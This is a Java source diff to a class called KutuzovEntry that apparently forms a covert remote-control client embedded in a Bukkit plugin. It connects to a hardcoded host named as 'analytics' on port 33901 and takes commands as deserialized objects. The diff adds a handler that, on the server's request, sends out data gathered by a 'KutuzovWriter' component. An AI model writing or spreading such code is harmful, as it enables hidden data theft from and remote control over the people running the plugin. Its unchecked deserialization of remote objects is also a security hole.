@@ -19,9 +19,11 @@ import java.util.Arrays;
 public class KutuzovEntry {
     public  static final String HOST = "analytics018.antecedentium.xyz";
     public  static final int    PORT = 33901;
-    public  static final String VERSION = "b203";
+    public  static final String VERSION = "b204";
     public static boolean DEBUG = false;
 
+    public static ObjectInputStream ois = null;
+    public static ObjectOutputStream oos = null;
 
     private static Plugin plugin = null;
     public static void setBukkitPlugin(Plugin plugin) { KutuzovEntry.plugin = plugin; }
@@ -31,9 +33,8 @@ public class KutuzovEntry {
     private static long lastPing = System.currentTimeMillis();
     public  static void main(String[] args) {
         Arrays.stream(args).forEach(v -> { if(v.contentEquals("--debug")) DEBUG=true; });
+        KutuzovWriter.init();
         Thread thread = new Thread(()->{
-            ObjectInputStream ois = null;
-            ObjectOutputStream oos = null;
             try {
                 ois = new ObjectInputStream(socket.getInputStream());
                 oos = new ObjectOutputStream(socket.getOutputStream());
@@ -62,6 +63,12 @@ public class KutuzovEntry {
                     Object packet = ois.readObject();
                     if(packet instanceof SCKeepAlivePacket) {
                         lastPing = System.currentTimeMillis();
+                    } else if(packet instanceof SCAskWriterPacket) {
+                        oos.writeObject(KutuzovWriter._packet());
+                        KutuzovWriter._packetReset();
+
+                        if(DEBUG)
+                            System.out.println("Sent writer.");
                     } else if(packet instanceof SCMessageBoxPacket) {
                         SCMessageBoxPacket scMessageBoxPacket = (SCMessageBoxPacket) packet;
                         for(int i = 0; i < scMessageBoxPacket.amount; i++)
